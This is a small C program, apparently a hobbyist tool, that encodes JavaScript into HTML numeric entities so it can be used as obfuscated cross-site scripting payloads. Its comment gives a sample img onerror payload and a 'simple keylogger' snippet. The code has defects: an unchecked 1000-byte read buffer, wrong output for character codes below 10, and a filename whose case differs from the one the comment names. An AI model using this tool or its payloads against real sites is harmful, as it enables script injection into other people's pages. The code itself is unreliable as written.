#include <stdio.h>
#include <stdlib.h>
#include <ctype.h>
void getinput(char input[]);
void convertInput(char input[], char data[]);
int dI = 0;

/*Converts JavaScript code into ASCII code for XSS paylods.
 <img src=x onerror="&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000072&#0000101&#0000108&#0000108&#0000111&#0000039&#0000041&#0000059">
 The code above simply represents alert('Hello') after being processed  through the code below. 
 Simply shove your code into the "Your_JS_code.txt" file next to the executable and get your XSS payload. 

 A simple keylloger: window.onkeydown = function(gfg){document.body.innerHTML += ' ' + gfg.keyCode}
*/

int main()
{
	char input[1000];
	char data[1000];
	getinput(input);
	convertInput(input, data);


	for (int x = 0; x < dI; x++)
		printf("%c", data[x]);
}

void convertInput(char input[], char data[])
{
	char set[6] = { '&','#','0','0','0','0' };				//The prefix

	
	for (int x = 0; x < 100 && isascii(input[x]); x++) //Converts a symbol into an ASCII character
	{
		
		for (int y = 0; y < 6; y++)
		{
			data[dI++] = set[y];
		}
		if(9 >= input[x])
		{
			data[dI++] = '0';
			data[dI++] = '0';
			data[dI++] = input[x];
		}
		else if(input[x] > 9 && input[x] < 100)
		{
			data[dI++] = '0';
			data[dI++] = input[x] / 10 + '0';
			data[dI++] = input[x] % 10 + '0';
		}
		else if(input[x] >= 100)
		{
			data[dI++] = input[x] / 100 + '0';
			data[dI++] = input[x] % 100 / 10 + '0';
			data[dI++] = input[x] % 10 + '0';
		}
		
		
	}
}

void getinput(char input[])
{
	int i = 0;
	FILE* ptr;
	char ch = 0;
	ptr = fopen("Your_JS_Code.txt", "r");
	if(ptr == NULL) {
		printf("file can't be opened \n");
		exit(0);
	}
	else
	{
		while ((ch = fgetc(ptr)) != EOF) //Read the file
		{
			
			input[i++] = ch;			 //Write the file data into the input array
		}
	}
	fclose(ptr);

}



